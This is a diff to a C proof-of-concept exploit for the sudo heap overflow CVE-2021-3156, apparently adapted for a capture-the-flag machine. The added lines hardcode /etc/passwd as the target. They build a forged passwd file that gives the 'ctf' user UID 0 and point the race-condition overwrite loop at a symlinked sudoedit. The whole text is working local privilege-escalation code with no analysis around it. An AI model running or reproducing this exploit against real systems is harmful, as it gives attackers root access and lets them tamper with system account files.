@@ -1,0 +1,61 @@
+diff --git a/exploit.c b/exploit.c
+index 4a54075..be27067 100644
+--- a/exploit.c
++++ b/exploit.c
+@@ -22,7 +22,7 @@
+ 
+ // !!! best value of this varies from system-to-system !!! 
+ // !!! you will probably need to tune this !!! 
+-#define RACE_SLEEP_TIME 10000
++#define RACE_SLEEP_TIME 3000
+ 
+ char *target_file;
+ char *src_file;
+@@ -59,16 +59,14 @@ char* get_my_username()
+ 
+ int main(int my_argc, char **my_argv)
+ {
++    system("ln -s /usr/bin/sudo /home/ctf/sudoedit");
++    system("cp /etc/passwd /home/ctf/fakepasswd");
++    system("sed -i 's/ctf:x:1000:1000/ctf:x:0:0/g' /home/ctf/fakepasswd");
++
+     puts("CVE-2021-3156 PoC by @gf_256");
+     puts("original advisory by Baron Samedit");
+-    
+-    if (my_argc != 3) {
+-        puts("./meme <target file> <src file>");
+-        puts("Example: ./meme /etc/passwd my_fake_passwd_file");
+-        return 1;
+-    }
+-    target_file = my_argv[1];
+-    src_file = my_argv[2];
++    target_file = "/etc/passwd";
++    src_file = "/home/ctf/fakepasswd";
+     printf("we will overwrite %s with shit from %s\n", target_file, src_file);
+ 
+     char* myusername = get_my_username();
+@@ -86,7 +84,7 @@ int main(int my_argc, char **my_argv)
+     char* bigshit = calloc(1,0x10000);
+     memset(bigshit, 'A', 0xffff); // need a big shit in the stack so the write doesn't fail with bad address
+ 
+-    char *argv[] = {"/usr/bin/sudoedit", "-A", "-s", "\\",
++    char *argv[] = {"/home/ctf/sudoedit", "-A", "-s", "\\",
+     overflow,
+     NULL
+     };
+@@ -121,14 +119,13 @@ int main(int my_argc, char **my_argv)
+             waitpid(childpid, 0, 0);
+         } else { // child
+             setpriority(PRIO_PROCESS, 0, 20); // set nice to 20 for race reliability
+-            execve("/usr/bin/sudoedit", argv, envp); // noreturn
++            execve("/home/ctf/sudoedit", argv, envp); // noreturn
+             puts("execve fails?!");
+             abort();
+         }
+ 
+         if (query_target_size() != initial_size) {
+             puts("target file has a BRUH MOMENT!!!! SUCCess???");
+-            system("xdg-open 'https://www.youtube.com/watch?v=4vkR1G_DUVc'"); // ayy lmao
+             return 0;
+         }
+     }
